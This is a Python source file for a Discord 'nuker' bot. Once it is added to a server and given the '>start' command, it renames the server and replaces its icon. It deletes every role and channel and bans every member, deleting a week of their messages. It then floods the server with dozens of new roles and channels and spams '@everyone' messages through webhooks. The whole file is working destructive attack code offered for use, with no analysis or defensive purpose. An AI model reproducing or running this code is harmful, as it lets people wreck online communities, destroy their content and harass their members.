from discord import Intents
from discord.ext import commands
from requests import put
import discord
from asyncio import create_task


prefix = '>' 
token = 'yo token here'
spamtext = '@everyone @here\n Imagine get nuked by Five bot \n https://github.com/glitch65/Discord-Five-nuker-bot \n XD '
ac_name="Five nuker on top"
ac_type= 1
silent_mode= 0


intents = Intents.default()
intents.members = True
client = commands.Bot(command_prefix=prefix, help_command=None, intents=intents.all())


@client.event
async def on_ready():
    if ac_type == 1 and silent_mode == 0:
        await client.change_presence(activity=discord.Game(name=ac_name))
    elif ac_type == 2 and silent_mode == 0:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ac_name))
    elif ac_type == 3 and silent_mode == 0:
        await client.change_presence(activity=discord.Streaming(name=ac_name, url='https://www.twitch.tv/discord'))
    elif ac_type == 4 and silent_mode == 0:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=ac_name))
    elif silent_mode == 1:
        await client.change_presence(status=discord.Status.offline)
f = open('icon.PNG', 'rb')
icona = f.read()





async def killobject(obj):
    try: await obj.delete()
    except: pass

async def sendch(ctx,channel: discord.TextChannel,count):
    for _ in range(count):
        try: await channel.send(spamtext)
        except: pass

async def createchannel(ctx,name):
    try:
        chan = await ctx.guild.create_text_channel(name=name)
        wb = await chan.create_webhook(name="Five nuker",avatar=icona)
        create_task(sendch(ctx,wb,60))
    except: pass

async def createrole(ctx):
    try: await ctx.guild.create_role(name='nuked-by-Five-nuker')
    except: pass

        
        
@client.command()
async def start(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name='Nuked by Five nuker<3', icon=icona)
    for rl in ctx.guild.roles:
        create_task(killobject(obj=rl))
    for channel in ctx.guild.channels:
        create_task(killobject(obj=channel))
    await bananaa(ctx=ctx)
    for _ in range(40):
        create_task(createrole(ctx))
    for _ in range(35):    
        create_task(createchannel(ctx,name="nuked by five nuker"))



async def bananaa(ctx):
    for member in list(ctx.guild.members):
      try:
        await member.ban(reason="XD", delete_message_days=7)
      except: pass
 






client.run(token)





